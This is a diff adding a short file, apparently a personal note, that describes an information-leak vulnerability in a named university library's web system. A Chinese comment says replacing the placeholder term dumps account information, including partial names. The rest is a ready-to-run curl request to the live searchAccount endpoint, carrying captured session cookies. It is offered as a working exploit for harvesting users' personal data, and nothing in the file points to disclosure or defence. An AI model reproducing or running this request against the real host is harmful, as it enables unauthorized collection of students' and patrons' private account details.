@@ -1,0 +1,9 @@
+#这是图书馆的一个漏洞，可以直接日出名字的一半和其他的东西
+
+替换xxxx即可爆出账号信息
+
+
+curl -i -s -k  -X $'GET' \
+    -H $'Host: libzw.ustb.edu.cn' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'X-Requested-With: XMLHttpRequest' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537' -H $'Referer: http://libzw.ustb.edu.cn/ClientWeb/xcus/ic2/Default.aspx' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: zh-CN,zh;q=0.9' -H $'Cookie: _ga=GA1.3.1448104650.1541553233; UM_distinctid=1672642825c6ac-0d8ede9b47576e-35607400-1fa400-1672642825d852; Hm_lvt_13b40e489bb711d52e8face65ffaa168=1542251986,1542533739,1544238473; _gid=GA1.3.2052820054.1544238474; _qddaz=QD.rlafeb.5mn3ae.jpewbd3z; pgv_pvi=4740851712; ASP.NET_SessionId=0sydbz55hvhd5545wtn1xmrk' -H $'Connection: close' \
+    -b $'_ga=GA1.3.1448104650.1541553233; UM_distinctid=1672642825c6ac-0d8ede9b47576e-35607400-1fa400-1672642825d852; Hm_lvt_13b40e489bb711d52e8face65ffaa168=1542251986,1542533739,1544238473; _gid=GA1.3.2052820054.1544238474; _qddaz=QD.rlafeb.5mn3ae.jpewbd3z; pgv_pvi=4740851712; ASP.NET_SessionId=0sydbz55hvhd5545wtn1xmrk' \
+    $'http://libzw.ustb.edu.cn/ClientWeb/pro/ajax/data/searchAccount.aspx?type=&=&term=xxxxxxxxxxx&_=1544324913123'
